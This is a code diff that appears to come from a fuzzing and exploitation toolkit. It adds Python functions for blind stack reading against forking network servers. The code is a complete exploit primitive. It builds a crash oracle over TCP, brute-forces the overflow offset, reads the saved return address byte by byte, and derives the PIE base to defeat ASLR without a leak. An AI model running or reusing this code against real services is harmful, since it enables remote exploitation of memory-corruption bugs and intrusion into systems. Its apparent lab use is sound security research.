@@ -137,3 +137,94 @@ def wait_for_port(proc, *, timeout: float = 5.0):
     None if it never listened. Reuses netfuzz's discovery so there is one definition of it."""
     from ..fuzz import netfuzz
     return netfuzz._wait_for_port(proc, "tcp", None, timeout)
+
+
+# ---------------------------------------------- blind stack reading (no-win, no-leak PIE base)
+# A forking server that sends a response ONLY AFTER the vulnerable function returns gives a
+# crash-vs-survived oracle: a saved return address that keeps its real bytes lets the function
+# return and the server responds; a corrupted byte crashes the child and no response comes. That
+# oracle reads the saved return address off the stack ONE BYTE AT A TIME -- the byte value that
+# survives is the real one -- recovering a live code pointer, and thus the PIE base, with no leak
+# and no win() (classic BROP "stack reading"). The server's layout is stable across forked children,
+# so the reads are deterministic rather than a 1/16 gamble.
+
+def make_survive_oracle(port: int, *, host: str = "127.0.0.1", token: bytes = b"OK",
+                        timeout: float = 0.8, tries: int = 3):
+    """survives(payload) -> True iff the child did NOT crash (its post-return response `token`
+    arrived). Retries a negative `tries` times: a real survival reliably sends the token, so a retry
+    clears a transient socket timeout, while a real crash never sends it and stays False."""
+    def survives(payload: bytes) -> bool:
+        for _ in range(tries):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            try:
+                s.connect((host, port))
+                s.sendall(payload)
+                try:
+                    if token in s.recv(64):
+                        return True
+                except socket.timeout:
+                    pass
+            except OSError:
+                pass
+            finally:
+                try:
+                    s.close()
+                except OSError:
+                    pass
+        return False
+    return survives
+
+
+def find_overflow_offset(survives, *, lo: int = 8, hi: int = 512):
+    """The smallest overflow length that crashes the child -- the distance to the first saved
+    pointer (saved rbp, just below the return address). b"A"*L survives while L stays within the
+    buffer and crashes once it clobbers that pointer."""
+    for L in range(lo, hi):
+        if not survives(b"A" * L):
+            return L - 1
+    return None
+
+
+def read_saved_bytes(survives, offset: int, nbytes: int) -> bytes:
+    """Recover `nbytes` of saved stack data above `offset`, byte by byte: for each position the one
+    byte value that still lets the child return (survives) is the real byte; the rest crash."""
+    known = bytearray()
+    for _ in range(nbytes):
+        g = next((b for b in range(256)
+                  if survives(b"A" * offset + bytes(known) + bytes([b]))), None)
+        if g is None:                                    # past the reliably-crashing region
+            break
+        known.append(g)
+    return bytes(known)
+
+
+def _return_value(known: bytes, ret_low12: int):
+    """The 8-byte little-endian window in `known` that is the saved RETURN address: its low 12 bits
+    equal the (page-invariant) low 12 bits of the return site, and it is a canonical userspace
+    code pointer. The saved rbp in the same read is a STACK pointer and is rejected by the low-12
+    check -- that is how the code pointer is told apart without a leak."""
+    for i in range(0, max(0, len(known) - 7)):
+        v = int.from_bytes(known[i:i + 8], "little")
+        if (v & 0xFFF) == (ret_low12 & 0xFFF) and 0x400000 <= v < 0x800000000000:
+            return v
+    return None
+
+
+def recover_pie_base_blind(survives, ret_site_off: int, *, offset=None, read_words: int = 2):
+    """Recover a forking PIE server's image base with NO leak and NO win(): find the overflow
+    offset, stack-read the saved return address, and subtract the (static) return-site offset.
+    `ret_site_off` is where in the image the vulnerable call returns to (the instruction after the
+    `call`, from the disassembly). Returns (base, return_address, offset) or None."""
+    if offset is None:
+        offset = find_overflow_offset(survives)
+    if offset is None:
+        return None
+    known = read_saved_bytes(survives, offset, read_words * 8)
+    ra = _return_value(known, ret_site_off)
+    if ra is None:
+        return None
+    base = ra - ret_site_off
+    if base > 0 and (base & 0xFFF) == 0:
+        return base, ra, offset
+    return None
